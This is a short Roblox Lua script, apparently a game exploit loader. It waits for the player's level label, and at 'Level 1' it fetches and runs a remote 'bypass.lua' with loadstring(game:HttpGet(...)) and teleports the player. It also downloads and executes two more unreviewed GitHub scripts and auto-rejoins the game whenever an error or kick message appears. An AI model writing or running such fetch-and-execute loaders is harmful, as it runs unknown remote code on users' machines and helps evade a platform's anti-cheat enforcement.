wait(2)
local player = game:GetService("Players").LocalPlayer
local levelLabel = player:WaitForChild("PlayerGui"):WaitForChild("HUD"):WaitForChild("Top"):WaitForChild("Currencies"):WaitForChild("Level"):WaitForChild("LevelAmount")
local http = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")

local function checkLevel()
    if levelLabel.Text == "Level 1" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Zayn31214/name/refs/heads/main/bypass.lua"))()
        teleportService:Teleport(115110570222234, player)
    end
end

levelLabel:GetPropertyChangedSignal("Text"):Connect(checkLevel)
checkLevel()

wait(2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/medusaky/code/refs/heads/main/blr.lua", true))()

local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer
local function onErrorMessageChanged(errorMessage)
    if errorMessage and errorMessage ~= "" then
        print("Error detected: " .. errorMessage)
        if player then
            wait()
            TeleportService:Teleport(game.PlaceId, player)
        end
    end
end
GuiService.ErrorMessageChanged:Connect(onErrorMessageChanged)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Zayn31214/name/refs/heads/main/SterlingNew"))()

